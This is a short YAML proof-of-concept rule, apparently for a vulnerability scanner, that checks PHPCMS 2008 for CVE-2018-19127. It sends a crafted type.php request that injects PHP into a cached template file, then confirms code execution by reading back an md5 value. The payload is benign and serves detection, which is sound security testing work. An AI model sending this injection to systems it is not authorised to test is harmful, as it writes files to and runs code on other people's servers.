name: poc-yaml-phpcms-cve-2018-19127
binding: 8a5ac140-95b4-4f48-b0c3-7f7322fd6b96
manual: true
detail:
    author: pa55w0rd(www.pa55w0rd.online/)
    links:
        - https://github.com/ab1gale/phpcms-2008-CVE-2018-19127
    vulnerability:
        id: CT-72214
        level: critical
    Affected Version: PHPCMS2008
    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
transport: http
set:
    r: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /type.php?template=tag_(){}%3b@unlink(file)%3becho md5($_GET[1])%3b{//../rss
            follow_redirects: true
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /data/cache_template/rss.tpl.php?1={{r}}
            follow_redirects: true
        expression: response.body.bcontains(bytes(md5(string(r))))
expression: r0() && r1()
